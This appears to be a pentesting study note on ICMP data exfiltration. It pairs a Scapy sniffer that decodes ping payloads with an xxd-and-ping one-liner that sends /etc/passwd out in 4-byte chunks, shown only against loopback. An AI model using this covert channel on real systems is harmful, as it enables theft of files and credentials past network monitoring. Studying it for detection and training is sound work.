Using [[ping]] we can use the option `-p` to send a *"pattern"* 

```bash
ping -c 1 -p 6c65206c 127.0.0.1
```

We can listen that [[Internet Control message Protocol (ICMP)]] packets with a few lines of [[Python]] we can create a [[Sniffer]] using [[Scapy]] library listening in `loopback` network interface.

```python
#!/usr/bin/python3

from scapy.all import *
import signal
import sys
import argparse

def handler(sig, frame):
    print("\n\t [!] Exiting.")
    sys.exit(1)


signal.signal(signal.SIGINT, handler)

def data_parser(packet):
    if ICMP in packet and packet[ICMP].type == 8 and hasattr(packet[ICMP], "load"):
        try:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end="")
        except Exception as e:
            print(f"\n[!] Error decoding data: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", default="lo", help="Interface to sniff on")
    args = parser.parse_args()
    print("[*] Sniffing... Press Ctrl+C to stop.")
    sniff(iface=args.iface, filter="icmp", prn=data_parser)
```

then, with [[xxd]] you can decompose a file you want send.

```bash
xxd -d -c 4 /etc/passwd
```

`-c 4` divide the output into rows of 4 for ping convenience.

With sniffer running, we can read all result of `xxd` and send pings traces to the `loopback` interface.

```bash
xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line 127.0.0.1; done
```

In the sniffer you should visualize the content.